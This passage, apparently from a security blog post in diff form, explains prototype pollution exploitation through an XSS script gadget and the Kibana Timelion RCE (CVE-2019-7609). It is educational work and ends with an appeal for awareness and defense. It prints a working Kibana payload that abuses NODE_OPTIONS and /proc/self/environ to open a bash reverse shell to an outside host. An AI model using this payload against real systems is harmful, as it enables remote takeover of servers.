+    <span class="token literal-property property">style</span><span class="token operator">:</span> r<span class="token punctuation">.</span>generate<span class="token punctuation">.</span><span class="token function">relativeBlockCss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token literal-property property">tabindex</span><span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Therefore, by polluting <code>innerHTML</code>, an attacker can use this script gadget to create an XSS vulnerability. The actual attack method is to construct a URL that can trigger prototype pollution + XSS. Simply pass the URL to someone else, and when they click on it, they will be directly attacked.</p>
+<p>The second example is a vulnerability in Kibana, and the original article can be found here: <a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a>. The official description of this vulnerability is as follows:</p>
+<blockquote>
+<p>An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p>
+</blockquote>
+<p>In Kibana, there is a Timelion feature that allows users to enter syntax and draw charts. The following syntax can pollute the prototype:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">.</span>es<span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x<span class="token operator">=</span><span class="token string">'ABC'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Polluting the prototype is just the first step. The next step is to find a script gadget. One of the Kibana scripts looks like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> env <span class="token operator">=</span> options<span class="token punctuation">.</span>env <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">;</span>
+<span class="token keyword">var</span> envPairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> env<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> value <span class="token operator">=</span> env<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    envPairs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This script will construct an environment variable that will be used to run a new node process. For example, if envPairs is <code>a=1</code>, it should run the command <code>a=1 node xxx.js</code>.</p>
+<p>Since it runs node.js, we can secretly introduce a file using the <code>NODE_OPTIONS</code> environment variable:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// a.js</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a.js'</span><span class="token punctuation">)</span>
+
+<span class="token comment">// b.js</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'b.js'</span><span class="token punctuation">)</span>
+
+<span class="token comment">// 跑這個指令，用環境變數引入 a.js</span>
+<span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">"--require ./a.js"</span> node b<span class="token punctuation">.</span>js
+
+<span class="token comment">// 輸出</span>
+a<span class="token punctuation">.</span>js
+b<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Therefore, if we can upload a js file, we can use prototype pollution to execute this file. It sounds a bit complicated. Is there another way?</p>
+<p>Yes! A common technique is to control the content of some files, such as the PHP session content, which can be controlled, as described in this article: <a target="_blank" rel="noopener" href="https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce">Triggering RCE by introducing PHP session files through LFI</a>. Another file in Linux systems, <code>/proc/self/environ</code>, contains all the environment variables of the current process. </p>
+<p>If we create an environment variable called <code>A=console.log(123)//</code>, the contents of <code>/proc/self/environ</code> will change:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">A</span><span class="token operator">=</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token comment">//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>becomes valid JS code!</p>
+<p>So you can execute it like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">"--require /proc/self/environ"</span> <span class="token constant">A</span><span class="token operator">=</span><span class="token string">'console.log(1)//'</span> node b<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>The code provided by the author looks like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">.</span><span class="token function">es</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">AAAA</span><span class="token operator">=</span><span class="token string">'require("child_process").exec("bash -i >&amp; /dev/tcp/192.168.0.136/12345 0>&amp;1");process.exit()//'</span><span class="token punctuation">)</span>
+<span class="token punctuation">.</span><span class="token function">props</span><span class="token punctuation">(</span>label<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_OPTIONS</span><span class="token operator">=</span><span class="token string">'--require /proc/self/environ'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>It pollutes two different properties, creates two environment variables, one to turn <code>/proc/self/environ</code> into valid JS and includes the code to execute, and the other <code>NODE_OPTIONS</code> uses <code>--require</code> to import <code>/proc/self/environ</code>, finally creating an RCE vulnerability that can execute any code!</p>
+<h2><span id="conclusion">Conclusion</span></h2><p>Before I got into cybersecurity, I had never heard of prototype pollution.</p>
+<p>So when I first encountered the prototype pollution vulnerability, I was a bit surprised. What surprised me was why I had never heard of it before? Compared to common vulnerabilities in front-end development such as XSS or CSRF, the notoriety of prototype pollution seems to be much lower.</p>
+<p>Some people may have first heard of this term because a certain NPM package had this vulnerability, which was fixed after upgrading to a new version, but they may not have understood the cause of the vulnerability and its potential impact.</p>
+<p>I actually quite like this vulnerability, first because I think the cause is interesting, and second because I think finding script gadgets is also interesting. In any case, I hope that through this article, more front-end engineers can become aware of this vulnerability and understand its principles and defense methods.</p>
+<p>Finally, I recommend a great article that automatically detects prototype pollution vulnerabilities and identifies problem areas, which I think takes prototype pollution to another level: <a target="_blank" rel="noopener" href="https://blog.s1r1us.ninja/research/PP">A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild</a></p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Front-end/">#Front-end</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2021/10/11/en/xss-history/">XSS from scratch: history and origin</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2021/09/26/en/what-is-open-redirect/">Issues to be aware of when implementing redirect functionality: Open Redirect</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2021/09/29/prototype-pollution/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
